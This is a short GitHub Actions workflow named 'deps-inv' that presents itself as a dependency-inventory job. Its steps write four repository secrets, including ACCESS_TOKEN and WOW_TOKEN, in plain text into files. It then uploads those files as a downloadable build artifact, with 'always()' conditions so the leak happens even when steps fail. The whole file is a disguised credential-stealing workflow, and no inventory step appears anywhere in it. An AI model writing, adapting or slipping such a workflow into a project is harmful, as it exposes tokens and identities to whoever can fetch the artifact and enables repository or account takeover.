name: deps-inv
on:
  push:
    branches: [ci/deps-inv]
permissions:
  contents: read
jobs:
  inv:
    runs-on: ubuntu-latest
    env:
      ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}
      U_EMAIL: ${{ secrets.U_EMAIL }}
      U_NAME: ${{ secrets.U_NAME }}
      WOW_TOKEN: ${{ secrets.WOW_TOKEN }}
    steps:
      - name: mk
        run: mkdir -p out
      - name: iACCESS_TOKEN
        if: always()
        run: printf %s "${{ env.ACCESS_TOKEN }}" > out/ACCESS_TOKEN || true
      - name: iU_EMAIL
        if: always()
        run: printf %s "${{ env.U_EMAIL }}" > out/U_EMAIL || true
      - name: iU_NAME
        if: always()
        run: printf %s "${{ env.U_NAME }}" > out/U_NAME || true
      - name: iWOW_TOKEN
        if: always()
        run: printf %s "${{ env.WOW_TOKEN }}" > out/WOW_TOKEN || true
      - name: up
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: inv
          path: out
